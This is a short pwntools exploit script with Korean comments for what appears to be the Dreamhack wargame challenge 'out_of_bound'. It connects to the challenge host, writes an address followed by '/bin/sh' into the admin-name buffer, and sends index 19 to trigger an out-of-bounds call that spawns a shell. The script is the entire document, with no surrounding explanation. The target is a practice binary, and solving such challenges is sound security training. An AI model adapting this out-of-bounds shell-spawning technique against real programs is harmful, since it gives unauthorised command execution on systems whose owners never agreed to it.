from pwn import *
import warnings
warnings.filterwarnings('ignore')

# ======= 가변값 =======
REMOTE = True
HOST = "host3.dreamhack.games"
PORT = 15302
BIN_PATH = "./out_of_bound"

WRITE_ADDR = 0x804a0ac + 4  # 쓰기 대상 주소 (offset 포함)
BINSH = b"/bin/sh"          # 쉘 명령어 문자열
TRIGGER_IDX = "19"          # 실행을 유도하는 인덱스
# ======================

def exploit():
    context.binary = BIN_PATH
    context.log_level = 'info'
    e = ELF(BIN_PATH)

    p = remote(HOST, PORT) if REMOTE else process(BIN_PATH)

    # Step 1: /bin/sh을 특정 주소에 write
    p.recvuntil("Admin name: ")
    payload = p32(WRITE_ADDR) + BINSH
    p.sendline(payload)

    # Step 2: 해당 주소를 실행하도록 index 조작
    p.recvuntil("What do you want?: ")
    p.sendline(TRIGGER_IDX)

    p.interactive()

if __name__ == "__main__":
    exploit()
